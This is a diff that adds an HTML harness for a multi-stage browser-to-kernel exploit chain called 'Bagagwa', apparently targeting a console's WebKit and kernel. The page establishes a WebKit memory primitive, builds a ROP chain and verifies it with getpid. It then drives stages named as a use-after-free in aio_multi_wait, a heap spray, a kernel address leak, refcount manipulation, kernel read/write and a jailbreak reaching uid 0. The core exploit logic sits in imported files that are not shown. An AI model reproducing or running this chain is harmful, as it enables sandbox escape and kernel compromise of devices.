@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bagagwa Multi Chain Exploit</title>
+<style>
+  html, body { margin: 0; padding: 0; min-height: 100%;
+    background: radial-gradient(circle at 50% 28%, #1a1a2e 0, #0f0f1a 44%, #080810 100%);
+    color: #d8dee9; }
+  body { box-sizing: border-box; min-height: 100vh;
+    font: 18px/1.4 "Consolas", "DejaVu Sans Mono", monospace;
+    padding: 24px 20px; display: flex; flex-direction: column;
+    align-items: center; }
+  h1 { font-size: 28px; margin: 0 0 4px; color: #eceff4; font-weight: 700; }
+  .sub { font-size: 16px; color: #7c8795; margin: 0 0 16px; }
+  #status { font-size: 22px; padding: 10px 14px; border-radius: 6px;
+    margin-bottom: 14px; background: #1b2430; border-left: 6px solid #5e81ac;
+    width: 100%; max-width: 800px; box-sizing: border-box; }
+  #status.ok { background: #16281c; border-left-color: #47c76a; color: #b8f0c6; }
+  #status.fail { background: #2a1215; border-left-color: #e74856; color: #ffd0d5; }
+  #status.run { border-left-color: #ebcb8b; color: #f6e6bd; }
+  #log { width: 100%; max-width: 800px; font-size: 14px; color: #8fa1b3;
+    background: #0e1420; border: 1px solid #2a3340; border-radius: 6px;
+    padding: 12px; overflow-y: auto; max-height: 60vh; white-space: pre-wrap;
+    box-sizing: border-box; }
+  .stage-hdr { color: #ebcb8b; font-weight: 700; }
+  .step { color: #a3be8c; }
+  .err { color: #e74856; }
+  .info { color: #7fb7d4; }
+  .warn { color: #d08770; }
+  #btn { margin: 16px 0; padding: 14px 32px; font-size: 22px; font-weight: 700;
+    background: #223146; border: 2px solid #5e81ac; border-radius: 8px;
+    color: #cfe3ff; cursor: pointer; }
+  #btn:hover { background: #2d4060; }
+  #btn:disabled { opacity: 0.4; cursor: default; }
+</style>
+</head>
+<body>
+
+<h1>Bagagwa Multi Chain Exploit</h1>
+<p class="sub">aio_multi_wait mode 0 UAF + syscall 727 leak + osem refcount</p>
+<p class="sub" style="color:#e74856;font-size:13px;" id="buildver">build: v12-submit-swap</p>
+
+<div id="crashlog" style="display:none;background:#3a1a00;border:2px solid #ff6600;
+  border-radius:6px;padding:12px;margin-bottom:10px;width:100%;max-width:800px;
+  box-sizing:border-box;font-size:13px;color:#ffcc80;white-space:pre-wrap;
+  max-height:40vh;overflow-y:auto;"></div>
+
+<div id="status">waiting for WebKit exploit primitives...</div>
+<button id="btn" disabled>Run Exploit</button>
+<button id="btnClear" style="margin:8px 0;padding:6px 16px;font-size:14px;
+  background:#2a1215;border:1px solid #e74856;border-radius:4px;color:#ffd0d5;
+  cursor:pointer;display:none;" onclick="try{localStorage.removeItem('bgw_log')}catch(e){}
+  document.getElementById('crashlog').style.display='none';
+  this.style.display='none';">Cancella log salvato</button>
+<div id="log"></div>
+
+<script>
+try {
+    var saved = localStorage.getItem("bgw_log");
+    if (saved) {
+        var el = document.getElementById("crashlog");
+        el.textContent = "=== LOG SALVATO (pre-crash) ===\n" + saved;
+        el.style.display = "block";
+        document.getElementById("btnClear").style.display = "inline-block";
+    }
+} catch(e) {}
+</script>
+
+<!-- classic scripts: rop.js defines worker_rop globally, main.js detects
+     firmware, injects the offset script, and defines prepare() globally -->
+<script src="rop.js"></script>
+<script src="main.js"></script>
+<script>
+window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src*="offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () { rej(new Error("offsets 404: " + s.src)); });
+});
+</script>
+<script src="syscalls.js"></script>
+
+<script type="module">
+import { establishPrimitive, fakeCellReleased } from "./core.js?v=final";
+import { installWindowP, pairStatus } from "./mem.js?v=final";
+import { int64 } from "./int64.js";
+
+const logEl = document.getElementById("log");
+const statusEl = document.getElementById("status");
+const btnEl = document.getElementById("btn");
+
+function _persist(msg) {
+    try {
+        var cur = localStorage.getItem("bgw_log") || "";
+        if (cur.length > 16000) cur = cur.slice(-8000);
+        localStorage.setItem("bgw_log", cur + msg + "\n");
+    } catch(e) {}
+}
+
+function log(msg, cls) {
+    const span = document.createElement("span");
+    span.className = cls || "";
+    span.textContent = msg + "\n";
+    logEl.appendChild(span);
+    logEl.scrollTop = logEl.scrollHeight;
+    _persist(msg);
+}
+
+function setStatus(text, cls) {
+    statusEl.textContent = text;
+    statusEl.className = cls || "";
+    _persist("[STATUS] " + text);
+}
+
+let P = null;
+let chain = null;
+let chainDead = false;
+let syscallCount = 0;
+
+const state = {
+    syscallsIssued: new Set(),
+    roundTrips: [],
+    fdOpen: new Set(),
+    cleanupFailed: "",
+};
+
+const track = fd => state.fdOpen.add(fd);
+const untrack = fd => state.fdOpen.delete(fd);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function classify(raw) {
+    if (!(raw instanceof int64)) return { s32: 0, failed: true };
+    const lo = raw.low | 0;
+    const carry = (raw.hi >>> 0) === 0xFFFFFFFF ? 1 : 0;
+    return { s32: lo, failed: carry === 1 && lo < 0 };
+}
+
+const ERRNO_NAMES = {
+    1: "EPERM", 2: "ENOENT", 3: "ESRCH", 9: "EBADF", 12: "ENOMEM",
+    13: "EACCES", 14: "EFAULT", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN",
+    36: "EINPROGRESS", 38: "ENOSYS", 45: "EOPNOTSUPP", 48: "EADDRINUSE",
+    61: "ECONNREFUSED", 78: "ENOSPC",
+};
+
+function errText(res) {
+    if (!res.failed) return "ok";
+    const n = (-res.s32) >>> 0;
+    return ERRNO_NAMES[n] || ("errno " + n);
+}
+
+const WATCHDOG_MS = 15000;
+async function watchdog(promise, what) {
+    let timer = null;
+    try {
+        return await Promise.race([
+            promise,
+            new Promise((_, rej) => {
+                timer = setTimeout(() => rej(new Error("WATCHDOG: " + what)), WATCHDOG_MS);
+            })
+        ]);
+    } finally {
+        if (timer !== null) clearTimeout(timer);
+    }
+}
+
+async function sys(num, a, b, c, d, e, f) {
+    if (chainDead) throw new Error("sys: chain dead");
+    if (P.syscalls[num] === undefined)
+        throw new Error("sys: 0x" + num.toString(16) + " no stub");
+    syscallCount++;
+    state.syscallsIssued.add(num);
+    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
+        "syscall 0x" + num.toString(16));
+    const cl = classify(raw);
+    return { raw, s32: cl.s32, failed: cl.failed,
+        hex: "0x" + raw.toString(), errText: errText({ s32: cl.s32, failed: cl.failed }) };
+}
+
+async function runChain() {
+    if (chainDead) throw new Error("chain dead");
+    await watchdog(chain.run(), "chain.run");
+}
+
+function i64(lo, hi) { return new int64(lo, hi); }
+
+function flushMark(tag, text) {
+    log("[" + tag + "] " + text, "info");
+}
+function queueEvent(tag, text) {
+    log("[" + tag + "] " + text, "info");
+}
+function note(s) {
+    log(s, "step");
+}
+
+async function init() {
+    setStatus("establishing WebKit primitive...", "run");
+    log("establishing WebKit exploit primitive...", "stage-hdr");
+
+    try {
+        if (typeof prepare !== "function")
+            throw new Error("main.js did not evaluate — prepare is undefined");
+        if (typeof worker_rop !== "function")
+            throw new Error("rop.js did not evaluate — worker_rop is undefined");
+
+        await window.offsetsReady;
+        log("offsets loaded for fw " + (window.fw_str || "unknown"), "step");
+
+        if (!wk_gadgetmap || !Object.keys(wk_gadgetmap).length
+            || !syscall_map || !Object.keys(syscall_map).length)
+            throw new Error("offset file empty: gadgets=" +
+                Object.keys(wk_gadgetmap || {}).length + " syscalls=" +
+                Object.keys(syscall_map || {}).length);
+
+        let p;
+        if (globalThis.p && typeof globalThis.p.read8 === "function") {
+            log("primitive already available (reused)", "step");
+            p = globalThis.p;
+        } else {
+            log("running WebKit exploit...", "step");
+
+            try { history.replaceState(null, ""); } catch (e) { }
+            if (typeof globalThis.gc === "function") {
+                try { globalThis.gc(); } catch (e) { }
+            }
+            await new Promise(r => setTimeout(r, 750));
+
+            const carrier = await establishPrimitive({
+                maxAttempts: 5,
+                onEvent(tag, detail, attempt) {
+                    if (tag === "ATTEMPT-START")
+                        log("exploit attempt " + attempt, "step");
+                    else
+                        log("[" + tag + "] " + detail, "info");
+                }
+            });
+
+            installWindowP(carrier, { onEvent: queueEvent });
+
+            if (typeof globalThis.gc === "function") {
+                try { globalThis.gc(); } catch (e) { }
+            }
+            await new Promise(r => setTimeout(r, 1000));
+
+            if (!pairStatus.promoted)
+                throw new Error("pair was NOT promoted (" +
+                    pairStatus.error + ")");
+
+            p = globalThis.p;
+            if (!p || typeof p.read8 !== "function")
+                throw new Error("window.p was never published");
+
+            log("primitive up: attempts=" + carrier.attempts +
+                " paired=" + pairStatus.promoted, "step");
+        }
+
+        log("prepare(): module bases, gadget/syscall tables, worker hijack...", "step");
+        const prepared = await prepare(p);
+        P = prepared.p;
+        chain = prepared.chain;
+
+        log("ROP chain ready, verifying with getpid()...", "step");
+        const pidRaw = await chain.syscall(SYS_GETPID);
+        const pid = classify(pidRaw);
+        log("getpid() = " + pid.s32, "step");
+
+        if (pid.s32 <= 0) {
+            setStatus("ROP chain verification failed", "fail");
+            return;
+        }
+
+        log("chain operational, pid=" + pid.s32 +
+            " gadgets=" + Object.keys(P.gadgets).length +
+            " syscalls=" + Object.keys(P.syscalls).length, "step");
+        setStatus("ready — press Run Exploit", "");
+        btnEl.disabled = false;
+
+    } catch (err) {
+        log("init error: " + (err.stack || err.message || err), "err");
+        setStatus("initialization failed: " + (err.message || err), "fail");
+    }
+}
+
+async function runExploit() {
+    btnEl.disabled = true;
+    try { localStorage.setItem("bgw_log", ""); } catch(e) {}
+    setStatus("running Bagagwa exploit...", "run");
+    log("\n=== BAGAGWA MULTI CHAIN EXPLOIT ===\n", "stage-hdr");
+
+    try {
+        const { makeBagagwaEngine } = await import("./bagagwa.js");
+
+        const driver = { core: 5, origMaskBytes: null, coreWhy: "default" };
+
+        const ctx = {
+            P, chain, i64, sys, runChain, mem: function(n) {
+                const ptr = P.malloc(n, 1);
+                return { ptr, u8: ptr.backing };
+            }, sleep, note,
+            track, untrack, state, driver,
+            flushMark, queueEvent,
+        };
+
+        const engine = makeBagagwaEngine(ctx);
+
+        log("\n--- Stage 0: aio_multi_wait UAF ---\n", "stage-hdr");
+        const s0 = await engine.stage0_uaf();
+        for (const s of s0.steps) log("  " + s, "step");
+        if (!s0.ok) {
+            log("STAGE 0 FAILED: " + s0.why, "err");
+            setStatus("stage 0 failed: " + s0.why, "fail");
+            return;
+        }
+        log("STAGE 0 OK", "step");
+
+        log("\n--- Stage 1: osem spray ---\n", "stage-hdr");
+        const s1 = await engine.stage1_spray();
+        for (const s of s1.steps) log("  " + s, "step");
+        if (!s1.ok) {
+            log("STAGE 1 FAILED: " + s1.why, "err");
+            setStatus("stage 1 failed: " + s1.why, "fail");
+            return;
+        }
+        log("STAGE 1 OK", "step");
+
+        log("\n--- Stage 2: kernel address leak ---\n", "stage-hdr");
+        const s2 = await engine.stage2_leak();
+        for (const s of s2.steps) log("  " + s, "step");
+        if (!s2.ok) {
+            log("STAGE 2 FAILED: " + s2.why, "err");
+            setStatus("stage 2 failed: " + s2.why, "fail");
+            return;
+        }
+        log("STAGE 2 OK", "step");
+
+        log("\n--- Stage 3: refcount manipulation ---\n", "stage-hdr");
+        const s3 = await engine.stage3_refcount();
+        for (const s of s3.steps) log("  " + s, "step");
+        if (!s3.ok) {
+            log("STAGE 3 FAILED: " + s3.why, "err");
+            setStatus("stage 3 failed: " + s3.why, "fail");
+            return;
+        }
+        log("STAGE 3 OK", "step");
+
+        log("\n--- Stage 4: reclaim + kernel R/W ---\n", "stage-hdr");
+        const s4 = await engine.stage4_reclaim();
+        for (const s of s4.steps) log("  " + s, "step");
+        if (!s4.ok) {
+            log("STAGE 4 FAILED: " + s4.why, "err");
+            setStatus("stage 4 failed: " + s4.why, "fail");
+            return;
+        }
+        log("STAGE 4 OK — kernel R/W established", "step");
+
+        log("\n--- Stage 5: jailbreak ---\n", "stage-hdr");
+        const s5 = await engine.stage5_jailbreak();
+        for (const s of s5.steps) log("  " + s, "step");
+        if (!s5.ok) {
+            log("STAGE 5 FAILED: " + s5.why, "err");
+            setStatus("stage 5 failed: " + s5.why, "fail");
+            return;
+        }
+
+        log("\n=== JAILBREAK COMPLETE ===", "stage-hdr");
+        log("uid: " + s5.before.uid + " -> " + s5.after.uid, "step");
+        log("getuid(): " + s5.after.getuid, "step");
+        log("kernel writes: " + engine.kernelWrites, "step");
+        setStatus("JAILBROKEN — uid=0, sandbox escaped", "ok");
+
+    } catch (err) {
+        log("exploit error: " + (err.stack || err.message || err), "err");
+        setStatus("exploit failed: " + (err.message || err), "fail");
+    }
+}
+
+btnEl.addEventListener("click", runExploit);
+
+if (typeof window !== "undefined" && window.location) {
+    init();
+} else {
+    setStatus("not running in a browser context", "fail");
+}
+</script>
+</body>
+</html>
